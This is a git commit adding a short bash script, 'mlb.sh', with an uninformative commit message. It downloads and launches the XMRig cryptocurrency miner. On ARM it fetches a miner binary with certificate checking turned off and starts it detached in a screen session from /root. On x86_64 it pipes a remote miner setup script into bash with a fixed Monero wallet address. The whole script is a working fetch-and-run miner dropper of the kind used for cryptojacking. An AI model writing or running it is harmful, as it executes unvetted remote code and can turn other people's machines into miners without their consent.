f6b4ff4ae023d26ff50f4c7f45acf43d2f703d57
gcp5678 <40751521+gcp5678@users.noreply.github.com>
2022-03-14 23:13:46 +0800

    mlb

---
+++ mlb.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+  OS=$(uname -m)
+  if [[ ${OS} == "aarch64" ]]; then
+  wget -N --no-check-certificate -q -O xmrig https://raw.githubusercontent.com/gcp5678/config/main/armxmrig && chmod 755 xmrig
+  screen -dmS xmrig /root/xmrig
+  fi
+  if [[ ${OS} == "x86_64" ]]; then
+  curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 46cLKftMHe7Qj4d4gJ9qrnDUk14JgVgsKiFcd16KCrwg5MQHheg8giXZUDduThkrNVC64E7YWgFeNUUBLARoWKwDCzatBkd
+  fi
+ 
